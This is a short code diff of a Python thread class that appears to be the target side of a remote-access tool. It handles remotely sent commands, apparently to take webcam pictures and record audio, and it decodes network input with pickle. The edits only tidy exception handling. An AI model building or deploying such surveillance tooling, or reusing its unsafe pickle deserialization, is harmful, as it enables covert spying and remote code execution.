@@ -32,7 +32,7 @@ class MenuHandlerTarget(threading.Thread):
 				option = self.connection.socket_interact.recv()
 				option = pickle.loads(option)
 				option = b64decode(option).decode()
-			except:
+			except Exception:
 				break
 
 			date_time = datetime.now().strftime("%d_%H_%M_%S")
@@ -52,7 +52,7 @@ class MenuHandlerTarget(threading.Thread):
 					data = b64encode(str(data).encode())
 					data = pickle.dumps(data)
 					self.connection.socket_interact.send(data)
-				except:
+				except Exception:
 					break
 			elif option == '2':
 				data = ["wcpic", date_time]
@@ -70,7 +70,7 @@ class MenuHandlerTarget(threading.Thread):
 					data = b64encode(str(data).encode())
 					data = pickle.dumps(data)
 					self.connection.socket_interact.send(data)
-				except:
+				except Exception:
 					break
 			elif option == '3':
 				data = ["audio", date_time]
@@ -88,9 +88,9 @@ class MenuHandlerTarget(threading.Thread):
 					data = b64encode(str(data).encode())
 					data = pickle.dumps(data)
 					self.connection.socket_interact.send(data)
-				except:
+				except Exception:
 					break
-			elif option == '4' or stop_threads:
+			elif option == '4':
 				data = ["close", date_time, "Exit"]
 				data = b64encode(str(data).encode())
 				data = pickle.dumps(data)
